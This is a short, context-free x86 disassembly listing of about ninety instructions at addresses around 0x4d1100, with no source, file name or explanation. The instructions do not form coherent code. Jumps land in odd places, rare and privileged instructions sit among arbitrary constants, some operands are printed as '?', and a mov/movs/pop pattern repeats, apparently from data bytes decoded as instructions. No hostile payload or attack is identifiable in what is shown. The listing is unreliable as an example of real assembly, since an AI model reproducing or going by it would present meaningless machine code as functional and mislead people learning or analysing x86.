  4d1102:	push   0xffffffe0
  4d1104:	test   DWORD PTR [ebp+0x0],edi
  4d1107:	jecxz  0x4d10f7
  4d1109:	jge    0x4d1175
  4d110b:	loop   0x4d1092
  4d110d:	jge    0x4d1179
  4d110f:	loop   0x4d1115
  4d1111:	sub    dl,BYTE PTR [ebp+0x51ab1fb7]
  4d1117:	mov    bl,0x1d
  4d1119:	stos   DWORD PTR es:[edi],eax
  4d111a:	push   ecx
  4d111b:	jo     0x4d10a9
  4d111d:	repz scas al,BYTE PTR es:[edi]
  4d111f:	mov    al,ds:0xc10c2776
  4d1124:	sti    
  4d1125:	sbb    ecx,DWORD PTR [eax]
  4d1127:	mov    WORD PTR [ebp+0x6740a7a3],?
  4d112d:	cwde   
  4d112e:	mov    BYTE PTR ds:[esi+0x14],0x76
  4d1133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d1135:	scas   ax,WORD PTR es:[edi]
  4d1137:	mov    edi,0xd371da45
  4d113c:	fnsave [ebp+ebp*8+0x7]
  4d1140:	sbb    al,0x57
  4d1142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1143:	fwait
  4d1144:	ret    
  4d1145:	cmp    cl,BYTE PTR [ecx]
  4d1147:	mov    WORD PTR [ebx+esi*8],?
  4d114a:	mov    ds:0x399f7909,eax
  4d114f:	and    BYTE PTR [eax+0x1c],dh
  4d1152:	xor    al,BYTE PTR [edi-0x79db0538]
  4d1158:	xchg   esi,esp
  4d115a:	and    eax,0xc7ae3b0d
  4d115f:	retf   0x11b5
  4d1162:	fwait
  4d1163:	in     al,dx
  4d1164:	mov    dh,0x82
  4d1166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1167:	pop    ebx
  4d1168:	mov    ch,0x82
  4d116a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d116b:	pop    ebx
  4d116c:	mov    ah,0x82
  4d116e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d116f:	pop    ebx
  4d1170:	mov    bl,0x82
  4d1172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1173:	pop    ebx
  4d1174:	mov    dl,0x82
  4d1176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1177:	pop    ebx
  4d1178:	mov    cl,0x82
  4d117a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d117b:	pop    ebx
  4d117c:	mov    al,0x82
  4d117e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d117f:	pop    ebx
  4d1180:	scas   eax,DWORD PTR es:[edi]
  4d1181:	and    BYTE PTR [ebx+ebx*2+0x5ba4daae],0xad
  4d1189:	and    BYTE PTR [ecx-0x5e7953a5],0x5b
  4d1190:	dec    ebp
  4d1191:	add    BYTE PTR ss:[esi+0x6979f227],bh
